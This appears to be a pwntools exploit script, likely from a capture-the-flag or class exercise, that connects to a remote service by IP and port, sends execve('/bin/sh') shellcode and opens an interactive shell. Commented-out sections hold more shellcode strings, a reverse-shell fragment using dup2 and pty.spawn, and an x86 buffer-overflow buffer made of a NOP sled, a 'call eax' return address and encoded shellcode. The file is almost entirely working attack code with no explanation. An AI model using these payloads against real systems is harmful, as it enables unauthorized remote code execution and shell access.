from pwn import *
context.arch = 'amd64'
# context(arch = 'i386', os = 'linux')
r = remote('155.69.149.208', 22803) # indicate the host and port payload = b"{shell code}" #shell code in bytes
# r.send(asm(shellcraft.sh())) # send the shell code
# payload = b"{\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05}"
# r.send(payload)
# print(asm(shellcraft.sh()))
# payload = b"{\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05}"
# print()
# r.send(b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05')
payload = b"{\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05}"
r.send(asm(shellcraft.sh()))
r.interactive()

# from pwn import *
# import socket, os, pty
#
# context.arch = 'amd64'
# write('flag', 'AABCDDAAACDAAAAAAAAAAAAAAAAAAA\n')
# sc = shellcraft.cat('flag') + shellcraft.exit(0)
# print(asm(sc))
# # print disasm(asm(sc))
# # 155.69.149.208 2280
# RHOST = "155.69.149.208"
# RPORT = 2280
# s = socket.socket()
# s.connect(RHOST, string(RPORT))
# # [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
# # pty.spawn("/bin/sh")

# !/bin/python
# Check the indentation and change the payload2 before use!!!



# p=remote('155.69.149.208', 22803)
# # print(asm(sc))
# p.send(asm(sc))
# # p.send(payload)


# payload1 = "\x90\x90\x90\x90\x83\xc4\x06\xff\xe4" + "A" * 19
# payload2 = (
#     "\x90\x90\x90\x90"
#     "\xbd\x28\x15\x40\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
#     "\x17\x31\x6b\x15\x03\x6b\x15\x83\xeb\xfc\xe2\xdd\x7f\x4b\x85"
#     "\x84\xd2\x2d\x5d\x9b\xb1\x38\x7a\x8b\x1a\x48\xed\x4b\x0d\x81"
#     "\x8f\x22\xa3\x54\xac\xe6\xd3\x5f\x33\x06\x24\xc3\x52\x72\x04"
#     "\x2c\xfd\x15\x29\x57\xd2\x99\xc6\xf9\x73\x68\x06\x60\xe0\xeb"
#     "\x3f\x42\x8c\x93\xcb\xba\x10\x43\x1b\xd9\x81\xed\x4c\x73\x31"
#     "\xd1\xa3\xb3\x8d\x3f\xf5\xf5\xdb\x11\xc4\xcd\x16\x43\x17\x19"
#     "\x6a\xbb\x6f\x5d\xb4\x83\x8f\xca\x97\x7a\x6e\x39\x97"
# )
# # 08 04 83 73 -- call eax memory address
# buffer = payload1 + "\x73\x83\x04\x08" + "\x90\x90\x90\x90\x90\x90" + payload2
# client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# #
# try:
#     print("\nSending buffer...")
#     client.connect(('155.69.149.208', 22803))
#     client.send(asm(sc))
#     response = client.recv(1024)
#     print(response)
#     client.close()
#     print("\nDone!")
# except:
#     print("Could not connect to the target!")


import socket
from pwn import *
# context.arch = 'amd64'
# write('flag', "execve(“bin/sh”)")
# sc = shellcraft.cat('flag') + shellcraft.exit(0)
# payload = "\x50\x59\x56\x54\x58\x31\x30\x58\x34\x31\x50\x5a\x34\x31\x48\x34\x41\x34\x49\x31\x54\x41\x37\x31\x54\x41\x44\x56\x54\x5a\x33\x32\x50\x5a\x4e\x42\x46\x5a\x44\x51\x43\x30\x32\x44\x51\x44\x30\x44\x31\x33\x44\x4a\x45\x32\x4f\x30\x5a\x32\x47\x37\x4f\x31\x45\x37\x4d\x30\x34\x4b\x4f\x31\x50\x30\x53\x32\x4c\x30\x59\x33\x54\x33\x43\x4b\x4c\x30\x4a\x30\x4e\x30\x30\x30\x51 \x35\x41\x31\x57\x36\x36\x4d\x4e\x30\x59\x30\x58\x30\x32\x31\x55\x39\x4a\x36\x32\x32\x41\x30\x48\x31\x59\x30\x4b\x33\x41\x37\x4f\x35\x49\x33\x41\x31\x31\x34\x43\x4b\x4f\x30\x4a\x31\x59\x34\x5a\x35\x46\x4d\x4c\x30\x4d"






# print(asm(shellcraft.sh()))
# print(shellcraft.sh())
# r.interactive() # make the shell interactive so we can send cat for flag